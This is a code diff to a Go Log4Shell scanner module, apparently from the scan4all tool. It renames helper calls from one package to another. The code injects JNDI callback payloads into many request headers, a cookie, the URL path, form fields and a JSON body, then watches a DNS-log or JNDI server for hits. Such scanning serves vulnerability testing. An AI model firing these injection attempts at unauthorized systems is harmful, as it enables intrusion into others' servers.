@@ -2,7 +2,7 @@ package log4j
 
 import (
 	"fmt"
-	"github.com/hktalent/scan4all/pkg"
+	"github.com/hktalent/scan4all/lib/util"
 	"github.com/hktalent/scan4all/pkg/jndi"
 	"net/url"
 	"regexp"
@@ -10,9 +10,9 @@ import (
 )
 
 func Check(u string, finalURL string) bool {
-	if (pkg.CeyeApi != "" && pkg.CeyeDomain != "") || jndi.JndiAddress != "" {
+	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
 		var host = "null"
-		randomstr := pkg.RandomStr()
+		randomstr := util.RandomStr()
 		if ux, err := url.Parse(u); err == nil {
 			host = strings.Replace(ux.Host, ":", ".", -1)
 		}
@@ -24,8 +24,8 @@ func Check(u string, finalURL string) bool {
 				var uri string
 				if jndi.JndiAddress != "" {
 					uri = jndi.JndiAddress + "/" + randomstr + "/"
-				} else if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-					uri = randomstr + "." + host + "." + pkg.CeyeDomain
+				} else if util.CeyeApi != "" && util.CeyeDomain != "" {
+					uri = randomstr + "." + host + "." + util.CeyeDomain
 				}
 				payload = strings.Replace(payload, "dnslog-url", uri, -1)
 				header := make(map[string]string)
@@ -50,22 +50,22 @@ func Check(u string, finalURL string) bool {
 				header["X-Device"] = payload
 				header["Token"] = payload
 				header["Cookie"] = "JSESSIONID=" + payload
-				_, _ = pkg.HttpRequset(domain+"/"+payload, "GET", "", false, header)
-				_, _ = pkg.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
-				_, _ = pkg.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
+				_, _ = util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
+				_, _ = util.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
+				_, _ = util.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 				header["Content-Type"] = "application/json"
-				_, _ = pkg.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
+				_, _ = util.HttpRequset(domain, "POST", "{\""+strings.Join(intputs, "\":"+"\""+payload+"\""+",\"")+"\":\""+payload+"\"}", false, header)
 			}
 		}
 		if jndi.JndiAddress != "" {
 			if jndi.Jndilogchek(randomstr) {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+				util.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
 				return true
 			}
 		}
-		if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-			if pkg.Dnslogchek(randomstr) {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
+		if util.CeyeApi != "" && util.CeyeDomain != "" {
+			if util.Dnslogchek(randomstr) {
+				util.GoPocLog(fmt.Sprintf("Found vuln Log4J JNDI RCE |%s\n", u))
 				return true
 			}
 		}
@@ -74,7 +74,7 @@ func Check(u string, finalURL string) bool {
 }
 
 func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
-	req, err := pkg.HttpRequset(domainurl, "GET", "", true, nil)
+	req, err := util.HttpRequset(domainurl, "GET", "", true, nil)
 	if err != nil {
 		return nil, nil
 	}
@@ -82,7 +82,7 @@ func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
 	hrefreg := regexp.MustCompile(`location.href='(.*?)'`)
 	hreflist := hrefreg.FindStringSubmatch(req.Body)
 	if hreflist != nil {
-		req, err = pkg.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
+		req, err = util.HttpRequset(domainurl+"/"+hreflist[len(hreflist)-1:][0], "GET", "", true, nil)
 		if err != nil {
 			return nil, nil
 		}
@@ -91,7 +91,7 @@ func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
 	domainlist := domainreg.FindStringSubmatch(req.Body)
 	if domainlist != nil {
 		domainx := domainlist[len(domainlist)-1:][0]
-		if pkg.StrContains(domainx, "http") {
+		if util.StrContains(domainx, "http") {
 			loginurl = append(loginurl, domainx)
 		} else if domainx == "" {
 			loginurl = loginurl
@@ -107,7 +107,7 @@ func getinputurl(domainurl string) (domainurlx []string, inputlist []string) {
 	if domainlist2 != nil {
 		for _, a := range domainlist2 {
 			domainx := a[1]
-			if pkg.StrContains(domainx, "http") {
+			if util.StrContains(domainx, "http") {
 				loginurl = append(loginurl, domainx)
 			} else if domainx == "" {
 				loginurl = append(loginurl, domainurl)
